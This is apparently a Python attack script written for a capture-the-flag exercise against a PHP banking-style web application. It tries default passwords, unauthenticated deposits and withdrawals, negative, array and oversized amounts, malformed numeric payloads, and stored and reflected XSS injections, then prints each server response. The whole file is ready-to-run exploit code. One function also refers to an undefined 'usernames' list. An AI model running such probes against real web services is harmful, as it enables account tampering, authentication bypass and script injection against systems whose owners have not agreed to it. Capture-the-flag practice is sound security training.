#!/usr/bin/python3

import requests
import argparse
import sys, os
import random
import time
import string

headers = {
        "Host" : "10.1.5.2",
        "User-Agent" : "curl.7.72.0",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache"
    }

registered_users={}

def usage():
    print("Exploiter script for Secure Server cctft")
    print("")
    print("Usage: ./exploiter.py ")
    print("-d --destination             - Ip of destination")
    print("-p --port                    - Destination port")
    print("")
    print("Example: ./exploiter.py -d 10.1.5.2 -p 80")
    sys.exit(0)

def get_random_string(length):
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def check_home(user, password, url):
    params = {
        'user': user,
        'pass': password,
        'drop': "balance"
    }
    r = requests.get(url, headers=headers, params=params)
    print(r.text)

def register(url):
    global registered_users

    user_registered = get_random_string(random.randint(5,15))
    password_registered = get_random_string(random.randint(8,10))

    registered_users[user_registered] = password_registered

    print("=====================Registering user {}============================".format(user_registered))

    params = {
        'user': user_registered,
        'pass': password_registered,
        'drop': "register"
    }

    r = requests.get(url, headers=headers, params=params)
    print("Payload: {}".format(r.url))
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("**********************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(user_registered, password_registered, url)
    else:
        print("Application responded with code {}".format(r.status_code))
    print("*************************************")
    print("====================================================================")


def no_auth_operation(url, operation, encode):
    user_not_registered = get_random_string(random.randint(4,15))
    password_not_registered = get_random_string(random.randint(8,10))

    while user_not_registered in registered_users.keys():
        user_not_registered = usernames[random.randint(0,9)]
    
    print("=====================Non authenticated operation============================")

    params = {}

    if encode:
        params = {
            'user': '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in user_not_registered),
            'pass': '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in password_not_registered),
            'drop': '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in operation),
            'amount': '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in str(random.randint(-2147483647,2147483647)))
        }
    else:    
        params = {
            'user': user_not_registered,
            'pass': password_not_registered,
            'drop': operation,
            'amount': random.randint(-2147483647, 2147483647)
        }

    url = url + "?user={}&pass={}&drop={}&amount={}".format(params['user'], params['pass'], params['drop'], params['amount'])
    
    print("Trying payload: {}".format(url))
    
    r = requests.get(url, headers=headers)
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("**********************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(user_not_registered, password_not_registered, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("============================================================================")

def negative_amount_exploit(url, drop, encode):
    username = list(registered_users.keys())[0]
    password = registered_users[username]
    
    params = {
        'user': username,
        'pass': password,
        'drop': drop
    }

    if encode:
        encoded_amount = '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in str(random.randint(-2147483647,-1)))
        params["amount"] = encoded_amount
    else:   
        params["amount"] = random.randint(-2147483647,-1)

    print("============================Trying to insert negative amount==========================")
    url = url + "?user={}&pass={}&drop={}&amount={}".format(params['user'], params['pass'], params['drop'], params['amount'])
    r = requests.get(url, headers = headers)
    print("Trying payload: {}".format(url))
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("**********************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("=======================================================================================")

def multiple_amounts_exploit(url, drop, encode):
    username = list(registered_users.keys())[0]
    password = registered_users[username]

    params = {
        'user': username,
        'pass': password,
        'drop': drop
    }

    amount_value1 = str(random.randint(-2147483647,2147483647))
    amount_value2 = str(random.randint(-2147483647,2147483647))
    amount_value3 = str(random.randint(-2147483647,2147483647))

    if encode:
        amount_value1 = '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in amount_value1)
        amount_value2 = '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in amount_value2)
        amount_value3 = '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in amount_value3)
        amount = [amount_value1, amount_value2, amount_value3]
    else:
        amount = [amount_value1, amount_value2, amount_value3]

    params['amount'] = amount

    print("=========================Trying amount array========================================")
    url = url + "?user={}&pass={}&drop={}&amount={}".format(params['user'], params['pass'], params['drop'], params['amount'])
    r = requests.get(url, headers=headers)
    print("Trying payload: {}".format(url))
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("**********************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("====================================================================================")

def large_amount_exploit(url, drop, encode):
    username = list(registered_users.keys())[0]
    password = registered_users[username]

    INT_MAX = 2147483647

    params = {
        'user': username,
        'pass': password,
        'drop' : drop
    }

    if encode:
        amount = '%' + '%'.join("{}".format(hex(ord(c))[2:]) for c in str(INT_MAX + random.randint(0,INT_MAX)))
    else:
        amount = INT_MAX + random.randint(0, INT_MAX)

    params['amount'] = amount

    print("=========================Trying very large amount========================================")
    url = url + "?user={}&pass={}&drop={}&amount={}".format(params['user'], params['pass'], params['drop'], params['amount'])
    r = requests.get(url, headers=headers)
    print("Trying payload: {}".format(url))
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("**********************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("=========================================================================================")

def custom_payloads(url, payload, drop):
    username = list(registered_users.keys())[0]
    password = registered_users[username]

    params = {
        'user': username,
        'pass': password,
        'drop': drop,
        'amount': payload
    }

    print("============================Trying with {} payload==================================".format(payload))
    r = requests.get(url, headers=headers, params=params)
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("**********************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("====================================================================================")


def stored_xss(url, encode):
    payload = ""
    if encode:
        payload = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
    else:
        payload = "<script>alert(1)</script>"

    username = payload
    password = "random"

    print("========================Trying Stored XSS===========================================")
    url = url + "?user={}&pass={}&drop=register".format(username, password)
    r = requests.get(url, headers=headers)
    print("Payload: {}".format(url))
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("*************************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("====================================================================================")

def reflected_xss(url, encode):
    payload = ""
    if encode:
        payload = "%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cscript%3E"
    else:
        payload = "</script><script>alert(1)</script><script>"

    username = "random"
    password = payload

    print("=======================Trying Reflected XSS========================================")
    url = url + "?user={}&pass={}&drop=register".format(username, password)
    print("Payload: {}".format(url))
    r = requests.get(url, headers=headers)
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("*************************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("====================================================================================")

def register_with_empty(url, param):
    username=""
    password=""

    if param == 0:
        password = get_random_string(random.randint(8,10))
    else:
        username = get_random_string(random.randint(8,10))

    url = url + "?user={}&pass={}&drop=register".format(username, password)
    print("Payload: {}".format(url))
    r = requests.get(url, headers=headers)
    print("*************************************")
    print("Server response: {}".format(r.text))
    print("*************************************")
    print("Checking home:")
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("*************************************")
    print("====================================================================================")
    

def main():
    parser = argparse.ArgumentParser(description="Exploiter script for Secure Server cctf")
    parser.add_argument("-d", "--destination", help="Destination IP Address")
    parser.add_argument("-p", "--port", default=80, help="Destinatin Port")
    args = parser.parse_args()

    if not len(sys.argv[1:]):
        usage()

    destination_ip = args.destination
    destination_port = int(args.port)
    url = "http://{}:{}/process.php".format(destination_ip, destination_port)
    
    try:

        ## Checking if default credentials work (Unlikely but still try it).
        check_home("jelena", "abcdef", url)
        time.sleep(1)
        check_home("john", "abcdef", url)
        time.sleep(1)
        check_home("kate", "abcdef", url)
        time.sleep(1)

        ## Register a user (in case authentication is enforced) to try some attacks.
        register(url)
        time.sleep(1)

        ## Try some operations without authentication.
        time.sleep(1)
        no_auth_operation(url, "deposit", False)
        time.sleep(1)
        no_auth_operation(url, "deposit", True)
        time.sleep(1)
        no_auth_operation(url, "withdraw", False)
        time.sleep(1)
        no_auth_operation(url, "withdraw", True)
        time.sleep(1)

        ## Try inserting negative amounts for deposits and withdrawals.
        negative_amount_exploit(url, "deposit", False)
        time.sleep(1)
        negative_amount_exploit(url, "deposit", True)
        time.sleep(1)
        negative_amount_exploit(url, "withdraw", False)
        time.sleep(1)
        negative_amount_exploit(url, "withdraw", True)
        time.sleep(1)

        ## Try passing the amount parameter as array.
        multiple_amounts_exploit(url, "deposit", False)
        time.sleep(1)
        multiple_amounts_exploit(url, "deposit", True)
        time.sleep(1)
        multiple_amounts_exploit(url, "withdraw", False)
        time.sleep(1)
        multiple_amounts_exploit(url, "withdraw", True)
        time.sleep(1)

        ## Try inserting a very large amount > INT_MAX.
        large_amount_exploit(url, "deposit", False)
        time.sleep(1)
        large_amount_exploit(url, "deposit", True)
        time.sleep(1)
        large_amount_exploit(url, "withdraw", False)
        time.sleep(1)
        large_amount_exploit(url, "withdraw", True)
        time.sleep(1)

        ## Try with some custom payloads to see if they do damage.
        custom_payloads(url, "-1&#45100", "deposit")
        time.sleep(1)
        custom_payloads(url, "-1&#45100", "withdraw")
        time.sleep(1)
        custom_payloads(url, "0.23e5", "deposit")
        time.sleep(1)
        custom_payloads(url, "0.23e5", "withdraw")
        time.sleep(1)
        custom_payloads(url, "0b11111111", "deposit")
        time.sleep(1)
        custom_payloads(url, "0b11111111", "withdraw")
        time.sleep(1)
        custom_payloads(url, "now()", "deposit")
        time.sleep(1)
        custom_payloads(url, "~2147483647", "withdraw")
        time.sleep(1)
        custom_payloads(url, "1"*310, "deposit")
        time.sleep(1)
        custom_payloads(url, "1"*310, "withdraw")

        ## Try some xss attacks.
        stored_xss(url, False)
        time.sleep(1)
        stored_xss(url, True)
        time.sleep(1)
        reflected_xss(url, False)
        time.sleep(1)
        reflected_xss(url, True)
        time.sleep(1)

        ## Register with empty username and password
        register_with_empty(url, 0)
        time.sleep(1)
        register_with_empty(url, 1)
        time.sleep(1)

    except KeyboardInterrupt:
        print('Operation interrupted by user')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)


if __name__ == "__main__":
    main()